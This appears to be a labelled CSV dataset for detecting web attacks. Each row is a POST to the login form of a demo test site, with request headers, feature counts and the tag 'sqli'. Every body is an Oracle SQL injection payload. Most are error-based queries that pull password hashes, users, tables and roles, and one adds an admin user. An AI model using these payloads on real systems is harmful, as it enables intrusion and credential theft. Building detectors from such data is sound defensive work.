method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time,nature
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '83', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' || myappadmin.adduser('admin', 'newpass') || '",48,1,0,2,6,0,0,0,5,1,0,0,302,398,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '128', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,93,0,0,4,4,0,0,0,9,1,0,0,302,291,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '116', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,81,0,0,4,4,0,0,0,7,1,0,0,302,276,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '119', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,84,0,0,4,4,0,0,0,7,1,0,0,302,259,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '117', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,82,0,0,4,4,0,0,0,7,1,0,0,302,275,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '120', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,85,0,0,4,4,0,0,0,7,1,0,0,302,396,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '136', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,101,0,0,8,4,0,0,0,7,1,0,0,302,377,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '132', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,97,0,0,8,4,0,0,0,7,1,0,0,302,376,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '139', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,104,0,0,8,4,0,0,0,7,1,0,0,302,369,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '145', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,110,0,0,8,4,0,0,0,7,1,0,0,302,363,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '170', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,135,0,0,8,4,0,0,0,9,1,0,0,302,358,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '193', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",158,1,0,10,4,0,0,0,15,1,0,0,302,355,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '189', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",154,1,0,10,4,0,0,0,15,1,0,0,302,364,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '198', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",163,1,0,10,4,0,0,0,15,1,0,0,302,645,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",166,1,0,10,4,0,0,0,15,1,0,0,302,655,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",195,1,0,10,4,0,0,0,17,1,0,0,302,652,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '193', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",158,1,0,10,4,0,0,0,15,1,0,0,302,644,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '189', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",154,1,0,10,4,0,0,0,15,1,0,0,302,305,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '198', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",163,1,0,10,4,0,0,0,15,1,0,0,302,327,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",166,1,0,10,4,0,0,0,15,1,0,0,302,290,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",195,1,0,10,4,0,0,0,17,1,0,0,302,306,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '193', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",158,1,0,10,4,0,0,0,15,1,0,0,302,373,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '189', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",154,1,0,10,4,0,0,0,15,1,0,0,302,362,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '198', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",163,1,0,10,4,0,0,0,15,1,0,0,302,356,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",166,1,0,10,4,0,0,0,15,1,0,0,302,340,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",195,1,0,10,4,0,0,0,17,1,0,0,302,270,sqli
